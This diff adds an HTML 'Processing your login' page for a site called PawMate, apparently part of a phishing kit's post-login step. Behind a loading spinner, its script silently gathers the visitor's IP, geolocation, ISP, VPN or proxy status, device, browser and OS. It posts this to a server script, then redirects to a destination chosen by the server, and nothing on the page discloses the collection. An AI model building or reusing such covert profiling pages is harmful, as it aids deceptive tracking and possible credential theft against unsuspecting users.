@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Processing... | PawMate</title>
+	<style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #ffffff;
+        }
+
+        .logo {
+            width: 120px;
+            height: 60px;
+            margin-bottom: 2rem;
+            object-fit: contain;
+        }
+
+        .loading-text {
+            color: #333333;
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #e6a100;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <img src="https://i.postimg.cc/m2dtB6Kr/PawMate6.png" alt="PawMate Logo" class="logo">
+    <div class="spinner"></div>
+    <p class="loading-text">Processing your login, please wait...</p>
+    
+    <script>
+        class ClientInfoCollector {
+            constructor() {
+                this.userAgent = navigator.userAgent;
+                this.platform = navigator.platform;
+                this.ipApiBaseUrl = 'http://ip-api.com/json/';
+            }
+
+            async collectAll() {
+                const info = {
+                    ip: await this.getIpAddress(),
+                    location: await this.getLocation(),
+                    isp: await this.getIspInfo(),
+                    vpn: await this.isVpn(),
+                    device: this.getDeviceType(),
+                    model: this.getDeviceModel(),
+                    browser: this.getBrowserInfo(),
+                    os: this.getOperatingSystem()
+                };
+                return info;
+            }
+
+            async getIpAddress() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'Unable to detect IP';
+                }
+            }
+
+            async getLocation() {
+                try {
+                    const response = await fetch(this.ipApiBaseUrl);
+                    const data = await response.json();
+                    
+                    if (data.status === 'success') {
+                        return {
+                            city: data.city,
+                            region: data.regionName,
+                            country: data.country,
+                            countryCode: data.countryCode
+                        };
+                    } else {
+                        return 'Location data unavailable';
+                    }
+                } catch (error) {
+                    return 'Unable to detect location';
+                }
+            }
+
+            async getIspInfo() {
+                try {
+                    const response = await fetch(this.ipApiBaseUrl);
+                    const data = await response.json();
+                    
+                    if (data.status === 'success') {
+                        return {
+                            isp: data.isp
+                        };
+                    } else {
+                        return 'ISP information unavailable';
+                    }
+                } catch (error) {
+                    return 'Unable to detect ISP';
+                }
+            }
+
+            async isVpn() {
+                try {
+                    const response = await fetch(this.ipApiBaseUrl);
+                    const data = await response.json();
+                    
+                    if (data.status === 'success') {
+                        // Check for proxy, VPN, or data center
+                        return {
+                            detected: data.proxy,
+                            type: data.proxy ? this.determineConnectionType(data) : 'Direct Connection'
+                        };
+                    } else {
+                        return {
+                            detected: false,
+                            type: 'Unable to determine'
+                        };
+                    }
+                } catch (error) {
+                    return {
+                        detected: false,
+                        type: 'Detection failed'
+                    };
+                }
+            }
+
+            determineConnectionType(data) {
+                if (data.hosting || /hosting|cloud/i.test(data.isp)) {
+                    return 'Data Center/Hosting';
+                } else if (/vpn/i.test(data.isp)) {
+                    return 'VPN';
+                } else if (data.proxy) {
+                    return 'Proxy/VPN';
+                }
+                return 'Unknown Proxy Type';
+            }
+
+            getDeviceType() {
+                const mobile = /Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(this.userAgent);
+                const tablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(this.userAgent.toLowerCase());
+
+                if (tablet) return 'Tablet';
+                if (mobile) return 'Mobile';
+                return 'Desktop';
+            }
+
+            getDeviceModel() {
+                const regex = /\(([^)]+)\)/;
+                const matches = this.userAgent.match(regex);
+                if (matches && matches[1]) {
+                    return matches[1];
+                }
+                return 'Unknown Model';
+            }
+
+            getBrowserInfo() {
+                const browsers = {
+                    'Chrome': /chrome|chromium|crios/i,
+                    'Firefox': /firefox|fxios/i,
+                    'Safari': /safari/i,
+                    'Edge': /edge|edg/i,
+                    'Opera': /opera|opr/i,
+                    'IE': /msie|trident/i
+                };
+
+                for (const [browser, regex] of Object.entries(browsers)) {
+                    if (regex.test(this.userAgent)) {
+                        const version = this.userAgent.match(/(?:chrome|chromium|firefox|safari|edg|opera|opr|msie|rv)\/?\s*(\d+(\.\d+)?)/i);
+                        return {
+                            name: browser,
+                            version: version ? version[1] : 'Unknown'
+                        };
+                    }
+                }
+                return { name: 'Unknown Browser', version: 'Unknown' };
+            }
+
+            getOperatingSystem() {
+                const os = {
+                    'Windows': /Windows NT (\d+\.\d+)/,
+                    'Mac': /Mac OS X (\d+[._]\d+[._]\d+)?/,
+                    'Linux': /Linux/,
+                    'Android': /Android (\d+(\.\d+)*)/,
+                    'iOS': /OS (\d+[._]\d+[._]?\d*)+ like Mac OS X/
+                };
+
+                for (const [name, regex] of Object.entries(os)) {
+                    const match = this.userAgent.match(regex);
+                    if (match) {
+                        const version = match[1] ? match[1].replace(/_/g, '.') : 'Unknown';
+                        return { name, version };
+                    }
+                }
+                return { name: 'Unknown OS', version: 'Unknown' };
+            }
+        }
+
+		const clientInfoCollector = new ClientInfoCollector();
+
+		window.onload = async function() {
+			const urlParams = new URLSearchParams(window.location.search);
+			const status = urlParams.get('status');
+
+			if (status === 'success') {
+				try {
+					// Collect client info dynamically
+					const clientInfo = await clientInfoCollector.collectAll();
+					
+					// Send collected client info to server
+					const response = await fetch('../php/client_info.php', {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json'
+						},
+						body: JSON.stringify(clientInfo)
+					});
+
+					const result = await response.json();
+
+					// alert(`Server response: ${JSON.stringify(result)}`);
+
+					// Fetch the final destination from the server
+					const destinationResponse = await fetch('../php/get_destination.php');
+					const destinationData = await destinationResponse.json();
+
+					if (destinationData && destinationData.destination) {
+						// Redirect to the final destination
+						window.location.href = destinationData.destination;
+					} else {
+						throw new Error('Destination not found');
+					}
+				} catch (error) {
+					console.error('Error during processing:', error);
+					alert('An error occurred during processing.');
+				}
+			}
+		};
+
+    </script>
+</body>
+</html>
